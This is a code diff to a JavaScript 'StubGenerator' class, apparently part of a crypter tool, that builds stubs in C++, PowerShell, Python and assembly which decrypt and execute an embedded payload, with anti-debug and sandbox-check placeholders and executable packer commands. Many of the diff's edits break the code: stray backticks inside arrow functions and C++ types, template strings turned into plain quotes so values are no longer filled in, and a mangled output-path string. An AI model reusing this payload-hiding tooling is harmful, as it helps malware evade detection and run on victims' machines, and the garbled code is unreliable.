@@ -4,6 +4,7 @@ const path = require('path');
 const crypto = require('crypto');
 const { exec, spawn } = require('child_process');
 const { promisify } = require('util');
+const { getMemoryManager } = require('../utils/memory-manager');
 const os = require('os');
 const zlib = require('zlib');
 const { logger } = require('../utils/logger');
@@ -11,6 +12,19 @@ const { logger } = require('../utils/logger');
 const execAsync = promisify(exec);
 
 class StubGenerator {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor(options = {}) {
         // OpenSSL toggle for encryption algorithms
         this.useOpenSSL = options.useOpenSSL !== false; // Default to true
@@ -203,7 +217,7 @@ class StubGenerator {
             }
         };
         
-        this.generatedStubs = new Map();
+        this.generatedStubs = this.memoryManager.createManagedCollection('generatedStubs', 'Map', 100);
         
         // Advanced options
         this.obfuscationMethods = {
@@ -291,7 +305,7 @@ class StubGenerator {
             // Resolve encryption method based on OpenSSL toggle
             const encryptionMethod = this.resolveEncryptionMethod(requestedMethod);
             
-            logger.info(`Generating stub: ${stubType} with ${encryptionMethod}`, { target, stubId });
+            logger.info(`Generating stub: ${stubType} with encryptionMethod`, { target, stubId });
             
             // Validate encryption method
             if (!this.encryptionMethods[encryptionMethod]) {
@@ -537,7 +551,7 @@ class StubGenerator {
         return {
             method: 'triple',
             data: Buffer.concat([...keys, encrypted]),
-            keys: keys.map(key => key.toString('hex'))
+            keys: keys.map(key =>` key.toString('hex'))
         };
     }
 
@@ -837,7 +851,7 @@ class StubGenerator {
         return {
             method: 'multiparty',
             data: Buffer.concat([iv, encrypted]),
-            keys: keys.map(key => key.toString('hex')),
+            keys: keys.map(key =>` key.toString('hex')),
             iv: iv.toString('hex'),
             threshold: 2 // Require 2 out of 3 keys
         };
@@ -886,13 +900,13 @@ class StubGenerator {
     // Get stub template
     getStubTemplate(stubType) {
         const templates = {
-            cpp: `#include <iostream>
-#include <vector>
-#include <string>
-#include <windows.h>
-#include <openssl/evp.h>
-#include <openssl/aes.h>
-#include <openssl/rand.h>
+            cpp: `#include <iostream>`
+#include <vector>`
+#include <string>`
+#include <windows.h>`
+#include <openssl/evp.h>`
+#include <openssl/aes.h>`
+#include <openssl/rand.h>`
 
 // Anti-Debug Code
 {ANTI_DEBUG}
@@ -921,7 +935,7 @@ int main() {
     }
     
     // Decrypt and execute payload
-    std::vector<unsigned char> payload = decryptPayload();
+    std::vector<unsigned char>` payload = decryptPayload();
     if (!payload.empty()) {
         executePayload(payload);
     }
@@ -1472,15 +1486,15 @@ check_sandbox endp`,
     getCppDecryptionCode(encryptionMethod, encryptedPayload) {
         switch (encryptionMethod) {
             case 'aes-256-gcm':
-                return `std::vector<unsigned char> decryptPayload() {
+                return "std::vector<unsigned char>` decryptPayload() {
     const std::string key = "${encryptedPayload.key}";
     const std::string iv = "${encryptedPayload.iv}";
-    const std::string authTag = "${encryptedPayload.authTag}";
+    const std::string authTag = `${encryptedPayload.authTag}`;
     
     // Convert hex strings to bytes
-    std::vector<unsigned char> keyBytes = hexToBytes(key);
-    std::vector<unsigned char> ivBytes = hexToBytes(iv);
-    std::vector<unsigned char> authTagBytes = hexToBytes(authTag);
+    std::vector<unsigned char>` keyBytes = hexToBytes(key);
+    std::vector<unsigned char>` ivBytes = hexToBytes(iv);
+    std::vector<unsigned char>` authTagBytes = hexToBytes(authTag);
     
     // Initialize OpenSSL
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
@@ -1490,7 +1504,7 @@ check_sandbox endp`,
     EVP_DecryptUpdate(ctx, NULL, NULL, (unsigned char*)"RawrZ-Stub-Generator", 19);
     
     // Decrypt
-    std::vector<unsigned char> decrypted(system_data.length());
+    std::vector<unsigned char>` decrypted(system_data.length());
     int len;
     EVP_DecryptUpdate(ctx, decrypted.data(), &len, (unsigned char*)system_data.c_str(), system_data.length());
     
@@ -1505,20 +1519,20 @@ check_sandbox endp`,
     
     decrypted.resize(len + finalLen);
     return decrypted;
-}`;
+}";
             
             case 'aes-256-cbc':
-                return `std::vector<unsigned char> decryptPayload() {
+                return "std::vector<unsigned char>` decryptPayload() {
     const std::string key = "${encryptedPayload.key}";
-    const std::string iv = "${encryptedPayload.iv}";
+    const std::string iv = `${encryptedPayload.iv}`;
     
-    std::vector<unsigned char> keyBytes = hexToBytes(key);
-    std::vector<unsigned char> ivBytes = hexToBytes(iv);
+    std::vector<unsigned char>` keyBytes = hexToBytes(key);
+    std::vector<unsigned char>` ivBytes = hexToBytes(iv);
     
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, keyBytes.data(), ivBytes.data());
     
-    std::vector<unsigned char> decrypted(system_data.length());
+    std::vector<unsigned char>` decrypted(system_data.length());
     int len;
     EVP_DecryptUpdate(ctx, decrypted.data(), &len, (unsigned char*)system_data.c_str(), system_data.length());
     
@@ -1529,22 +1543,22 @@ check_sandbox endp`,
     
     decrypted.resize(len + finalLen);
     return decrypted;
-}`;
+}";
             
             case 'chacha20':
-                return `std::vector<unsigned char> decryptPayload() {
+                return "std::vector<unsigned char>` decryptPayload() {
     const std::string key = "${encryptedPayload.key}";
     const std::string nonce = "${encryptedPayload.nonce}";
-    const std::string authTag = "${encryptedPayload.authTag}";
+    const std::string authTag = `${encryptedPayload.authTag}`;
     
-    std::vector<unsigned char> keyBytes = hexToBytes(key);
-    std::vector<unsigned char> nonceBytes = hexToBytes(nonce);
-    std::vector<unsigned char> authTagBytes = hexToBytes(authTag);
+    std::vector<unsigned char>` keyBytes = hexToBytes(key);
+    std::vector<unsigned char>` nonceBytes = hexToBytes(nonce);
+    std::vector<unsigned char>` authTagBytes = hexToBytes(authTag);
     
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     EVP_DecryptInit_ex(ctx, EVP_chacha20_poly1305(), NULL, keyBytes.data(), nonceBytes.data());
     
-    std::vector<unsigned char> decrypted(system_data.length());
+    std::vector<unsigned char>` decrypted(system_data.length());
     int len;
     EVP_DecryptUpdate(ctx, decrypted.data(), &len, (unsigned char*)system_data.c_str(), system_data.length());
     
@@ -1557,14 +1571,14 @@ check_sandbox endp`,
     
     decrypted.resize(len + finalLen);
     return decrypted;
-}`;
+}";
             
             case 'hybrid':
-                return `std::vector<unsigned char> decryptPayload() {
-    const std::string salt = "${encryptedPayload.salt}";
-    std::vector<unsigned char> saltBytes = hexToBytes(salt);
+                return "std::vector<unsigned char>` decryptPayload() {
+    const std::string salt = `${encryptedPayload.salt}`;
+    std::vector<unsigned char>` saltBytes = hexToBytes(salt);
     
-    std::vector<unsigned char> decrypted(system_data.length());
+    std::vector<unsigned char>` decrypted(system_data.length());
     
     for (size_t i = 0; i < system_data.length(); i++) {
         unsigned char byte = system_data[i];
@@ -1576,24 +1590,24 @@ check_sandbox endp`,
     }
     
     return decrypted;
-}`;
+}";
             
             case 'triple':
-                return `std::vector<unsigned char> decryptPayload() {
+                return "std::vector<unsigned char>` decryptPayload() {
     const std::string key1 = "${encryptedPayload.keys[0]}";
     const std::string key2 = "${encryptedPayload.keys[1]}";
-    const std::string key3 = "${encryptedPayload.keys[2]}";
+    const std::string key3 = `${encryptedPayload.keys[2]}`;
     
-    std::vector<unsigned char> key1Bytes = hexToBytes(key1);
-    std::vector<unsigned char> key2Bytes = hexToBytes(key2);
-    std::vector<unsigned char> key3Bytes = hexToBytes(key3);
+    std::vector<unsigned char>` key1Bytes = hexToBytes(key1);
+    std::vector<unsigned char>` key2Bytes = hexToBytes(key2);
+    std::vector<unsigned char>` key3Bytes = hexToBytes(key3);
     
-    std::vector<unsigned char> decrypted(system_data.length());
+    std::vector<unsigned char>` decrypted(system_data.length());
     system_data.copy(decrypted.data(), system_data.length());
     
     // 3 rounds: key XOR + bit rotation + position XOR (reverse order)
     for (int round = 0; round < 3; round++) {
-        std::vector<unsigned char>& keyBytes = (round == 0) ? key1Bytes : (round == 1) ? key2Bytes : key3Bytes;
+        std::vector<unsigned char>`& keyBytes = (round == 0) ? key1Bytes : (round == 1) ? key2Bytes : key3Bytes;
         
         for (size_t i = 0; i < decrypted.size(); i++) {
             decrypted[i] ^= keyBytes[i % keyBytes.size()];
@@ -1603,19 +1617,19 @@ check_sandbox endp`,
     }
     
     return decrypted;
-}`;
+}";
             
             default:
-                return `std::vector<unsigned char> decryptPayload() {
+                return `std::vector<unsigned char>` decryptPayload() {
     // Default decryption - return empty vector
-    return std::vector<unsigned char>();
+    return std::vector<unsigned char>`();
 }`;
         }
     }
     
     getAsmDecryptionCode(encryptionMethod, encryptedPayload) {
-        return `decrypt_payload proc
-    ; Decryption implementation for ${encryptionMethod}
+        return "decrypt_payload proc
+    ; Decryption implementation for " + encryptionMethod + "
     ; This is a simplified version - full implementation would be more complex
     
     push ebp
@@ -1635,11 +1649,11 @@ decrypt_loop:
     
     pop ebp
     ret
-decrypt_payload endp`;
+decrypt_payload endp";
     }
     
     getPowerShellDecryptionCode(encryptionMethod, encryptedPayload) {
-        return `function DecryptPayload {
+        return "function DecryptPayload {
     param(
         [string]$EncryptedData = "${encryptedPayload.data.toString('hex')}"
     )
@@ -1647,7 +1661,7 @@ decrypt_payload endp`;
     try {
         # Decryption logic for ${encryptionMethod}
         $key = "${encryptedPayload.key || crypto.randomBytes(32).toString('hex')}"
-        $iv = "${encryptedPayload.iv || crypto.randomBytes(16).toString('hex')}"
+        $iv = `${encryptedPayload.iv || crypto.randomBytes(16).toString('hex')}`
         
         # Convert hex to bytes
         $encryptedBytes = [System.Convert]::FromHexString($EncryptedData)
@@ -1669,11 +1683,11 @@ decrypt_payload endp`;
         Write-Error "Decryption failed: $($_.Exception.Message)"
         return $null
     }
-}`;
+}";
     }
     
     getPythonDecryptionCode(encryptionMethod, encryptedPayload) {
-        return `def decrypt_payload():
+        return "def decrypt_payload():
     try:
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.backends import default_backend
@@ -1687,20 +1701,20 @@ decrypt_payload endp`;
         cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
         decryptor = cipher.decryptor()
         
-        encrypted_data = bytes.fromhex("${encryptedPayload.data.toString('hex')}")
+        encrypted_data = bytes.fromhex(`${encryptedPayload.data.toString('hex')}`)
         decrypted = decryptor.update(encrypted_data) + decryptor.finalize()
         
         return decrypted
     except Exception as e:
         print(f"Decryption failed: {e}")
-        return None`;
+        return None";
     }
 
     // Generate output path
     generateOutputPath(target, stubType, encryptionMethod) {
         const targetName = path.basename(target, path.extname(target));
         const extension = this.stubTypes[stubType].extension;
-        return `${targetName}_${encryptionMethod}_stub${extension}`;
+        return `${targetName}_${encryptionMethod}_stubextension`;
     }
 
     // Get generated stubs
@@ -1820,7 +1834,7 @@ decrypt_payload endp`;
         if (this.useOpenSSL && !this.allowCustomAlgorithms) {
             if (this.isCustomEncryptionMethod(method)) {
                 const alternative = this.getOpenSSLAlternative(method);
-                logger.warn(`Encryption method ${method} not available in OpenSSL mode, using ${alternative} instead`);
+                logger.warn("Encryption method ${method} not available in OpenSSL mode, using " + alternative + " instead");
                 return alternative;
             }
         }
@@ -1919,7 +1933,7 @@ decrypt_payload endp`;
 
         return code.replace(/"([^"]+)"/g, (match, str) => {
             if (!encodedStrings.has(str)) {
-                encodedStrings.set(str, `_s${stringCounter++}`);
+                encodedStrings.set(str, "_s" + stringCounter++ + "");
             }
             return encodedStrings.get(str);
         });
@@ -1981,19 +1995,19 @@ decrypt_payload endp`;
             let command;
             switch (method) {
                 case 'upx':
-                    command = `upx --best "${executablePath}"`;
+                    command = "upx --best `${executablePath}`";
                     break;
                 case 'mpress':
-                    command = `mpress "${executablePath}"`;
+                    command = "mpress `${executablePath}`";
                     break;
                 case 'aspack':
-                    command = `aspack "${executablePath}"`;
+                    command = "aspack `${executablePath}`";
                     break;
                 case 'fsg':
-                    command = `fsg "${executablePath}"`;
+                    command = "fsg `${executablePath}`";
                     break;
                 case 'pecompact':
-                    command = `pecompact "${executablePath}"`;
+                    command = "pecompact `${executablePath}`";
                     break;
                 default:
                     return { success: false, error: 'Unknown packing method' };
@@ -2049,7 +2063,7 @@ decrypt_payload endp`;
     async checkCompilation(directory = './uploads') {
         try {
             const files = await fs.readdir(directory);
-            const cppFiles = files.filter(file => file.endsWith('.cpp'));
+            const cppFiles = files.filter(file =>` file.endsWith('.cpp'));
             const asmFiles = files.filter(file => file.endsWith('.asm'));
             const ps1Files = files.filter(file => file.endsWith('.ps1'));
             const pyFiles = files.filter(file => file.endsWith('.py'));
